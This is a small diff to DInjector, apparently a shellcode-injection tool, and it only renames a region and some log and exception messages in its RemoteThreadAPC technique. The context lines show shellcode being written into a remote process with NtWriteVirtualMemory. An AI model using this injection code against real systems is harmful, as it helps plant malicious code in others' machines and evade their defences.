@@ -42,7 +42,7 @@ namespace DInjector
 
             #endregion
 
-            #region NtWriteVirtualMemory
+            #region NtWriteVirtualMemory (shellcode)
 
             var buffer = Marshal.AllocHGlobal(shellcode.Length);
             Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
@@ -57,9 +57,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory");
+                Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory, shellcode");
             else
-                throw new Exception($"(RemoteThreadAPC) [-] NtWriteVirtualMemory: {ntstatus}");
+                throw new Exception($"(RemoteThreadAPC) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");
 
             Marshal.FreeHGlobal(buffer);
 
